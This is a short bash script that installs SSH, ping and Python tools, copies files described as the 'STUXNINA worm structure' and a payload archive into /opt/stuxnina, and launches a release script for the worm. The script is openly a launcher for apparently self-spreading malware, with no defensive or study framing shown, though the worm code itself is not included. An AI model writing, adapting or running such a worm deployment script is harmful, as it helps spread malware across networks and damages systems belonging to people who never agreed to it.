#!/bin/bash
set -e

echo "[+] Installing dependencies..."
sudo apt update && sudo apt install -y openssh-client iputils-ping python3 python3-pip

echo "[+] Deploying STUXNINA worm structure..."
mkdir -p /opt/stuxnina
cp -r release_stuxnina.py wormlib stuxnina_payload.pyz /opt/stuxnina/
chmod +x /opt/stuxnina/stuxnina_payload.pyz

echo "[+] Launching release script..."
cd /opt/stuxnina
python3 release_stuxnina.py
